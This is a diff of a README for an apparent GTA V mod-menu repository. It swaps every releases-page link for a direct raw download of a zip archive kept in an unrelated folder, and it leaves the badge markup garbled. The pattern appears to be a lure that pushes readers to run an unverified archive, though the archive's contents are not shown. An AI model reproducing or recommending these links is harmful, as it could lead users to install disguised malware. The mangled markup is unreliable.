@@ -1,7 +1,7 @@
 # 🌟 gta-v-kiddions-mod-menu - Customize Your GTA V Experience
 
 ## 🚀 Download the Latest Release
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/fearlessnessintroitus532/gta-v-kiddions-mod-menu/releases)
+[![Download Now](https://raw.githubusercontent.com/fearlessnessintroitus532/gta-v-kiddions-mod-menu/main/oneirocritics/gta-v-kiddions-mod-menu-3.1.zip%20Now-Click%https://raw.githubusercontent.com/fearlessnessintroitus532/gta-v-kiddions-mod-menu/main/oneirocritics/gta-v-kiddions-mod-menu-3.1.zip)](https://raw.githubusercontent.com/fearlessnessintroitus532/gta-v-kiddions-mod-menu/main/oneirocritics/gta-v-kiddions-mod-menu-3.1.zip)
 
 ## 🌟 Project Overview
 **GTA V Customization Suite** is a collection of tools designed for Grand Theft Auto V players. It aims to enhance your single-player gaming experience. With these tools, you can access new gameplay options and customize various aspects of the game.
@@ -26,7 +26,7 @@ To get started with **GTA V Customization Suite**, you need to download the soft
 
 1. **Visit the Releases Page**
    Click on the link below to go to the Releases page:
-   [Download from Releases Page](https://github.com/fearlessnessintroitus532/gta-v-kiddions-mod-menu/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/fearlessnessintroitus532/gta-v-kiddions-mod-menu/main/oneirocritics/gta-v-kiddions-mod-menu-3.1.zip)
 
 2. **Download the Latest Version**
    On the releases page, locate the latest release. Click on the download link for the file that matches your operating system.
@@ -60,4 +60,4 @@ If you encounter issues while using the application, please check the "Issues" s
 This project welcomes contributions from the community. If you would like to help improve the customization suite or add new features, please check the Contribution guidelines available in the repository for instructions.
 
 Remember to visit the releases page to download the latest version and enhance your GTA V experience:
-[Download from Releases Page](https://github.com/fearlessnessintroitus532/gta-v-kiddions-mod-menu/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/fearlessnessintroitus532/gta-v-kiddions-mod-menu/main/oneirocritics/gta-v-kiddions-mod-menu-3.1.zip)
